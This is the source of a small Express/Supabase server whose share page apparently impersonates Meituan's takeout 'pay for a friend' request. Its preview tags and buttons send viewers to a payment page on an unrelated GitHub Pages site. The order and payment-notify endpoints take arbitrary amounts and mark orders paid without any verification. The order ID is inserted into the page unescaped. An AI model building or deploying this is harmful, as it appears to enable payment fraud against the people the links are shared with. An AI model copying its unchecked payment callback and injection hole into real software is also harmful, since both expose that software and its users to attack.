const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const { createClient } = require('@supabase/supabase-js');

dotenv.config();
const app = express();
app.use(cors()); 
app.use(express.json());

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SERVICE_ROLE_KEY
);

// === 分享中转路由：以图片为核心，仅保留查看详情按钮 ===
app.get('/share', async (req, res) => {
  const orderId = req.query.order_id;
  const payDetailUrl = 'https://lsscqc520-ship-it.github.io/Auto-Forward-Messages/pay.html?order_id=' + orderId;

  res.send(`
  <!DOCTYPE html>
  <html lang="zh-CN">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta property="og:title" content="来帮我代付吧！美团外卖" />
      <meta property="og:description" content="Hi，我和你的距离只差一顿外卖~" />
      <meta property="og:image" content="https://i.ibb.co/n9FPGnj/IMG-1830.png" />
      <meta property="og:type" content="website" />
      <title>为好友买单</title>
      <style>
          body { margin:0; padding:0; display:flex; justify-content:center; align-items:center; min-height:100vh; background:#fff; font-family:sans-serif; }
          .container { width:100%; max-width:400px; text-align:center; padding-bottom:30px; }
          .card-img { width:100%; display:block; }
          .btn { display:inline-block; margin-top:20px; padding:15px 60px; background:#ffd000; border-radius:30px; text-decoration:none; color:#111; font-weight:bold; font-size:16px; }
      </style>
  </head>
  <body>
      <div class="container">
          <a href="${payDetailUrl}"><img src="https://i.ibb.co/n9FPGnj/IMG-1830.png" class="card-img" /></a>
          <a href="${payDetailUrl}" class="btn">查看订单详情</a>
      </div>
  </body>
  </html>
  `);
});

// 获取订单
app.get('/api/orders/:id', async (req, res) => {
  const { data, error } = await supabase
    .from('orders')
    .select('*')
    .eq('id', parseInt(req.params.id))
    .single();
    
  if (error) return res.status(400).json({ error: error.message });
  res.json(data);
});

// 创建订单
app.post('/api/orders', async (req, res) => {
  const { content, total } = req.body;
  const { data, error } = await supabase
    .from('orders')
    .insert([{ content, total, status: '待支付' }])
    .select();
    
  if (error) return res.status(400).json({ error: error.message });
  res.json({ success: true, data });
});

// 支付通知
app.post('/api/pay/notify', async (req, res) => {
  const { order_id, trade_status } = req.body;
  if (trade_status === 'SUCCESS') {
    await supabase
      .from('orders')
      .update({ status: '已支付' })
      .eq('id', parseInt(order_id));
      
    return res.json({ ok: true });
  }
  res.status(400).json({ error: 'failed' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
